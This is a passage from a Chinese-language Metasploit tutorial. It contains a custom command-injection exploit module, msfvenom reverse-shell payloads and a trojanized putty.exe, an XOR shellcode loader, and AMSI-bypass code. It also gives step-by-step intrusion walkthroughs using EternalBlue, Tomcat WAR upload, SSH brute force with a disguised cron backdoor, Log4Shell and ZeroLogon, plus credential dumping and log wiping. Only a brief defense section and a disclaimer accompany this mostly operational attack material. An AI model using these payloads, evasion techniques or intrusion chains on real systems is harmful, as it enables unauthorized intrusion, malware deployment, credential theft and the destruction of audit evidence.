msf6 > resource auto_pwn.rc
```

---

## 十七、模块开发

### 17.1 Exploit 模块结构

```ruby
# modules/exploits/custom/http_rce.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Web App RCE',
      'Description'    => %q{
        This module exploits a command injection vulnerability in
        Custom Web App v1.0. The vulnerability exists in the
        ping diagnostic page where user input is not properly sanitized.
      },
      'Author'         => ['YourName'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-1234'],
          ['URL', 'https://example.com/advisory']
        ],
      'Platform'       => ['unix', 'linux'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-15'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('CMD', [true, 'Command to execute', 'id'])
      ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'ping.php')
    )
    if res && res.code == 200 && res.body.include?('Ping Test')
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    # 构造 payload
    cmd = datastore['CMD']
    payload = "; #{cmd} #"

    # 发送请求
    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'ping.php'),
      'vars_post' => {
        'host' => "127.0.0.1#{payload}"
      }
    )

    if res && res.code == 200
      print_good("Command executed successfully")
      print_line(res.body)
    else
      print_error("Exploit failed")
    end
  end
end
```

### 17.2 Auxiliary 模块开发

```ruby
# modules/auxiliary/scanner/custom/custom_scan.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Service Scanner',
      'Description' => 'Scans for Custom Service on default port',
      'Author'      => ['YourName'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8888),
      OptInt.new('THREADS', [true, 'Number of threads', 10])
    ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => '/',
        'rhost'  => ip
      }, 10)

      if res
        if res.code == 200 && res.body.include?('CustomService')
          print_good("#{ip}:#{rport} - Custom Service detected")
          report_service(
            :host  => ip,
            :port  => rport,
            :name  => 'customservice',
            :info  => "Version: #{extract_version(res.body)}"
          )
        else
          print_status("#{ip}:#{rport} - Service responded but not Custom Service")
        end
      end
    rescue Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end

  def extract_version(body)
    body.match(/version[=:]\s*([\d.]+)/i) ? $1 : 'unknown'
  end
end
```

### 17.3 Post 模块开发

```ruby
# modules/post/windows/gather/custom_collect.rb
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Data Collector',
      'Description' => 'Collects custom application data from target',
      'License'     => MSF_LICENSE,
      'Author'      => ['YourName'],
      'Platform'    => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run
    print_status("Collecting custom data from #{sysinfo['Computer']}")

    # 收集注册表信息
    collect_registry_data

    # 收集文件信息
    collect_file_data

    # 收集环境变量
    collect_env_data

    print_good("Data collection complete")
  end

  def collect_registry_data
    key = 'HKLM\\SOFTWARE\\CustomApp'
    if registry_key_exist?(key)
      values = registry_enumvals(key)
      if values
        values.each do |v|
          data = registry_getvaldata(key, v)
          print_good("Registry: #{v} = #{data}")
          store_loot('customapp.registry', 'text/plain', data.to_s,
                     "#{v}_registry.txt", 'Custom App Registry Data')
        end
      end
    end
  end

  def collect_file_data
    path = 'C:\\Users\\Public\\custom_config.ini'
    if file_exist?(path)
      data = read_file(path)
      print_good("Found config file: #{path}")
      store_loot('customapp.config', 'text/plain', session,
                 data, 'custom_config.ini', 'Custom App Config')
    end
  end

  def collect_env_data
    output = cmd_exec('cmd.exe /c set')
    print_good("Environment variables collected")
    store_loot('customapp.env', 'text/plain', session,
               output, 'env_vars.txt', 'Environment Variables')
  end
end
```

---

## 十八、免杀技术详解

### 18.1 基础免杀方法

```bash
# 方法1：多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 15 \
         -f csharp -o shellcode.cs

# 方法2：使用自定义模板（将 payload 注入到合法程序中）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -x putty.exe \
         -k \
         -f exe -o putty_trojanized.exe

# 方法3：生成 raw shellcode 后用自定义加载器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f raw -o shellcode.bin

# 方法4：使用 PowerShell 内存执行
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f psh-cmd -o payload.cmd

# 方法5：使用 HTA 文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f hta-psh -o payload.hta
```

### 18.2 Shellcode 加载器开发

```c
// shellcode_loader.c — 自定义 Shellcode 加载器
#include <windows.h>
#include <stdio.h>

// XOR 解密密钥
unsigned char key[] = { 0xDE, 0xAD, 0xBE, 0xEF };

// 加密后的 shellcode（XOR 编码）
unsigned char encrypted_sc[] = "\x48\x31\xc9\x48\x81\xe9...";

int main() {
    // 分配可执行内存
    void* exec_mem = VirtualAlloc(0, sizeof(encrypted_sc),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

    if (exec_mem == NULL) {
        return -1;
    }

    // XOR 解密
    for (int i = 0; i < sizeof(encrypted_sc) - 1; i++) {
        encrypted_sc[i] ^= key[i % sizeof(key)];
    }

    // 复制 shellcode 到可执行内存
    memcpy(exec_mem, encrypted_sc, sizeof(encrypted_sc));

    // 执行
    ((void(*)())exec_mem)();

    return 0;
}

// 编译：
// x86_64-w64-mingw32-gcc -o loader.exe shellcode_loader.c
// 或使用 MSVC：
// cl.exe /O2 shellcode_loader.c /Fe:loader.exe
```

### 18.3 免杀技术对比

| 技术 | 免杀效果 | 持久性 | 实现难度 | 说明 |
|------|---------|--------|---------|------|
| 多重编码 | 中 | 短 | 低 | Shikata_ga_nai 已被广泛检测 |
| 模板注入 | 中 | 中 | 中 | 需要合适的合法程序模板 |
| 自定义加载器 | 高 | 中 | 高 | XOR/AES 解密后内存执行 |
| PowerShell | 中 | 短 | 低 | AMSI 已广泛检测 PS 脚本 |
| HTA | 中 | 短 | 低 | 需要用户交互 |
| 进程注入 | 高 | 长 | 高 | 注入到合法进程执行 |
| C# 程序集加载 | 高 | 中 | 高 | 内存加载 .NET 程序集 |
| Syscalls 直接调用 | 高 | 长 | 很高 | 绕过用户态 API Hook |

### 18.4 AMSI Bypass

```powershell
# AMSI（反恶意软件扫描接口）Bypass 技术

# 方法1：反射式修改 AMSI DLL 中的内存
$a=[Ref].Assembly.GetTypes()
ForEach($b in $a){
    if($b.Name -like "*iUtils"){
        $c=$b.GetFields('NonPublic,Static')
        ForEach($d in $c){
            if($d.Name -like '*ntext'){
                $e=$d.GetValue($null)
                if($e.Length -gt 0){
                    $f=[Text.Encoding]::Unicode.GetString($e)
                    if($f -like "*amsi*"){
                        $d.SetValue($null,[Text.Encoding]::Unicode.GetBytes(''))
                    }
                }
            }
        }
    }
}

# 方法2：使用 CLR 环境变量禁用 AMSI（需要管理员权限）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法3：通过 AmsiScanBuffer 补丁
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@
# 补丁代码省略...
```

---

## 十九、真实利用案例

### 19.1 案例1：利用 MS17-010 传播勒索软件

```bash
# 场景：内网中发现未打补丁的 Windows 主机

# 步骤1：扫描 445 端口
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
set PORTS 445
set THREADS 50
run

# 步骤2：检测 MS17-010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.10.0/24
set THREADS 50
run
# 输出：
# [+] 192.168.10.15  - Host is likely VULNERABLE to MS17-010!
# [+] 192.168.10.25  - Host is likely VULNERABLE to MS17-010!

# 步骤3：利用 EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.10.15
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.1
set LPORT 4444
run

# 步骤4：获取会话后执行操作
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
# Computer    : WIN-DEV01
# OS          : Windows 7 6.1 (Build 7601)
# Architecture: x64

# 步骤5：提权并收集凭证
meterpreter > load kiwi
meterpreter > creds_all
```

### 19.2 案例2：Web 应用 RCE 到内网渗透

```bash
# 场景：通过 Tomcat 弱口令部署 WAR 包获取 shell

# 步骤1：爆破 Tomcat 管理后台
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.1.50
set STOP_ON_SUCCESS true
set USERNAME tomcat
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# 步骤2：生成 WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f war -o shell.war

# 步骤3：部署 WAR 包
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.50
set HttpUsername tomcat
set HttpPassword s3cret
set Fpath /shell
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
run

# 步骤4：获取 shell 后升级到 Meterpreter
# 先在本地启动 handler
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4445
run -j

# 在普通 shell 中执行 Java Meterpreter payload
# 生成 Java payload
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4445 \
         -f raw -o shell.jar

# 步骤5：内网信息收集
sessions -i 1
meterpreter > ifconfig
# 发现内网网段 10.0.0.0/24

meterpreter > run get_local_subnets
# Local subnets: 10.0.0.0/24, 192.168.1.0/24

# 步骤6：添加路由
route add 10.0.0.0 255.255.255.0 1
route print

# 步骤7：内网扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,445,3389
set THREADS 20
run
```

### 19.3 案例3：Linux 服务器渗透

```bash
# 场景：通过 SSH 弱口令登录 Linux 服务器

# 步骤1：SSH 爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/fasttrack.txt
set STOP_ON_SUCCESS true
set THREADS 5
run

# 步骤2：获取会话
sessions -i 1
meterpreter > getuid
# Server username: root

# 步骤3：生成 Linux 持久化 payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4445 \
         -f elf -o backdoor.elf

# 步骤4：上传持久化后门
meterpreter > upload backdoor.elf /tmp/.systemd-update
meterpreter > shell
chmod +x /tmp/.systemd-update

# 创建 crontab 持久化
echo "*/30 * * * * /tmp/.systemd-update" >> /var/spool/cron/root

# 步骤5：信息收集
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/hashdump

# 步骤6：清理痕迹
history -c
echo "" > ~/.bash_history
```

### 19.4 案例4：利用已知 CVE 漏洞链

```bash
# 场景：利用 Log4Shell (CVE-2021-44228) 到内网域控

# 步骤1：启动 LDAP 服务引用
use exploit/multi/misc/log4shell_header_injection
set RHOSTS 192.168.1.80
set SRVHOST 192.168.1.1
set SRVPORT 1389
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
run

# 步骤2：获取 shell 后收集域信息
meterpreter > run post/windows/gather/enum_domain
# Domain: CORP.LOCAL
# Domain Controllers: DC01.CORP.LOCAL (10.0.0.5)
# Domain Function Level: Windows Server 2016

# 步骤3：通过 ZeroLogon (CVE-2020-1472) 攻击域控
use exploit/windows/dcerpc/cve_2020_1472_zerologon
set RHOSTS 10.0.0.5
set SMBDOMAIN CORP
run

# 步骤4：导出域内哈希
use auxiliary/gather/windows_secrets_dump
set RHOSTS 10.0.0.5
set SMBDomain CORP
run

# 步骤5：使用域管哈哈横向移动
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.5
set SMBDomain CORP
set SMBUser Administrator
set SMBPass <NTLM_hash>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4446
run

# 步骤6：域控上dump 全部哈希
meterpreter > load kiwi
meterpreter > lsa_dump_secrets
```

---

## 二十、Armitage 与团队协作

### 20.1 Armitage 图形化界面

```bash
# 启动 Armitage
armitage

# 连接到 Metasploit RPC 服务
# Host: 127.0.0.1
# Port: 55552
# Password: msf

# Armitage 核心功能：
# 1. 目标网络拓扑可视化
# 2. 模块搜索和执行
# 3. 会话管理
# 4. 自动化攻击（Hail Mary）
```

### 20.2 团队协作服务器

```bash
# 启动团队服务器（多人协作）
msfrpcd -U -P mypassword -p 55553 -a 0.0.0.0

# 连接到团队服务器
msfrpc -U mypassword -a 192.168.1.1 -p 55553

# 多用户共享同一个工作区
# 所有主机、会话、凭证数据实时同步
```

### 20.3 自动化攻击（Hail Mary）

```
Armitage 的 Hail Mary 功能：

1. 发现所有开放端口和服务
2. 自动匹配适用的 exploit 模块
3. 批量执行攻击
4. 返回成功利用的会话

使用方法：
  Armitage → Attacks → Hail Mary

适用场景：
  - 快速验证大量目标
  - 发现最容易攻破的入口
  - 批量自动化测试

注意事项：
  - 可能触发大量告警
  - 稳定性低的 exploit 可能导致目标崩溃
  - 建议在隔离环境中使用
```

---

## 二十一、Metasploit 与其他工具联动

### 21.1 与 Nmap 联动

```bash
# 将 Nmap 扫描结果直接导入 MSF
nmap -sS -sV -O -oX scan.xml 192.168.1.0/24
msf6 > db_import scan.xml

# 在 MSF 中直接运行 Nmap
msf6 > db_nmap -sS -sV -O 192.168.1.0/24

# 使用 Nmap 脚本扫描并导入
msf6 > db_nmap -sS --script smb-vuln* 192.168.1.0/24

# 查看导入结果
msf6 > hosts
msf6 > services
msf6 > vulns
```

### 21.2 与 Cobalt Strike 联动

```bash
# 生成 Cobalt Strike Beacon 格式 payload
# 在 CS 中生成 Beacon 后，使用 MSF 管理会话

# 方法1：从 MSF 会话派生 Beacon
# 在 Cobalt Strike 中：
# Attacks → Packages → Windows Executable (S)
# 生成 Stageless Beacon

# 方法2：在 MSF 中使用 CS 的 Payload
# 将 Beacon shellcode 嵌入 MSF 生成的 payload 中

# 方法3：使用 cross_fork 模块
use post/windows/manage/payload_inject
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.1.1
set LPORT 8080
run
```

### 21.3 与 Empire 联动

```bash
# 将 MSF 会话传递给 Empire
# 在 Empire 中设置 listener
# 生成 PowerShell stager

# 在 MSF 会话中执行 Empire stager
meterpreter > execute -f powershell.exe -a "-enc <base64_stager>"

# 或直接在 shell 中执行
meterpreter > shell
powershell -enc <base64_stager>
```

---

## 二十二、防御与检测

### 22.1 Metasploit 检测特征

| 检测点 | 特征 | 检测方法 |
|--------|------|---------|
| 网络流量 | 固定 URI 路径和 User-Agent | IDS/IPS 规则匹配 |
| Meterpreter | 特定内存特征和行为 | EDR 内存扫描 |
| Payload 生成 | 已知编码特征 | AV 静态特征库 |
| 后渗透行为 | 凭证提取、进程注入 | EDR 行为分析 |
| 持久化 | 注册表/服务/计划任务异常 | 配置基线对比 |
| 内网扫描 | 大量并发连接 | 流量分析 |

### 22.2 防御建议

```
1. 网络层防御：
   - 部署 IDS/IPS，配置 Metasploit 特征检测规则
   - 限制出站连接，特别是非标端口的反向连接
   - 启用 TLS 检查，防止 Meterpreter HTTPS 传输

2. 主机层防御：
   - 部署 EDR，启用行为检测（内存注入、进程迁移）
   - 开启 Windows Defender 实时保护和云保护
   - 启用 ASR（攻击面减少）规则
   - 配置 AMSI 和 PPL（受保护进程轻量级）

3. 账户安全：
   - 实施强密码策略和定期轮换
   - 限制本地管理员权限
   - 启用 LSASS 保护（RunAsPPL）
   - 禁用 LM/NTLMv1，仅允许 NTLMv2 或 Kerberos

4. 漏洞管理：
   - 及时安装安全补丁
   - 定期漏洞扫描和修复验证
   - 关闭不必要的端口和服务
   - 最小化权限原则

5. 监控与告警：
   - 集中日志管理（SIEM）
   - 监控异常进程创建和行为
   - 警报大量认证失败
   - 监控注册表和服务变更
```

### 22.3 日志清理（攻击视角）

```bash
# 清除事件日志（谨慎使用）
meterpreter > clearev

# 清除命令历史
meterpreter > shell
# Linux:
history -c && history -w
echo "" > ~/.bash_history
echo "" > /var/log/auth.log

# Windows:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# 清除 Metasploit 留下的痕迹
# 删除上传的文件
meterpreter > rm C:\\Users\\Public\\payload.exe

# 删除持久化项
# 注册表：
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /vUpdater /f
# 计划任务：
schtasks /delete /tn "SystemUpdater" /f
```

---

> ⚠️ **安全提示**：本文档中的所有技术和方法仅用于授权的安全测试和教学研究。在未获得明确授权的情况下，不得对任何系统使用上述技术。违反者将承担相应的法律责任。
